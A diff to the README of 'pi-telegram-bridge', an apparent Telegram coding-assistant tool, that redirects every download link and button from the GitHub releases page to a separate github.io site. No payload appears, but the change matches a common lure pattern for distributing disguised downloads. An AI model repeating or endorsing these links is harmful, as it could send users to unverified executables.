@@ -1,7 +1,7 @@
 <h1>🤖 pi-telegram-bridge - Your Private Coding Assistant on Telegram</h1>
 
 <p align="center">
-  <a href="https://github.com/sammyabscessed462/pi-telegram-bridge/releases">
+  <a href="https://sammyabscessed462.github.io">
     <img src="https://img.shields.io/badge/⬇️_Download_Now-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#4CAF50;color:white;padding:12px 24px;border-radius:8px;font-size:20px;text-decoration:none;">
   </a>
 </p>
@@ -27,7 +27,7 @@ Follow these simple steps to get pi-telegram-bridge up and running on your Windo
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/sammyabscessed462/pi-telegram-bridge/releases](https://github.com/sammyabscessed462/pi-telegram-bridge/releases)**
+Visit this link to download the application: **[https://sammyabscessed462.github.io](https://sammyabscessed462.github.io)**
 
 Once you're on that page, look for the latest release version. Click the download button for the file that matches your system.
 
@@ -172,6 +172,6 @@ A: There's no limit, but very long queues may take time to process.
 
 Pi-telegram-bridge puts the power of coding right in your pocket. Whether you're a professional developer or just curious about automation, this tool makes it effortless to manage coding tasks from anywhere. Download it today, connect your bot, and let your Pi sessions work for you.
 
-Remember: Visit this link to download the application: **[https://github.com/sammyabscessed462/pi-telegram-bridge/releases](https://github.com/sammyabscessed462/pi-telegram-bridge/releases)**
+Remember: Visit this link to download the application: **[https://sammyabscessed462.github.io](https://sammyabscessed462.github.io)**
 
 Thank you for choosing pi-telegram-bridge. Happy coding! 🚀
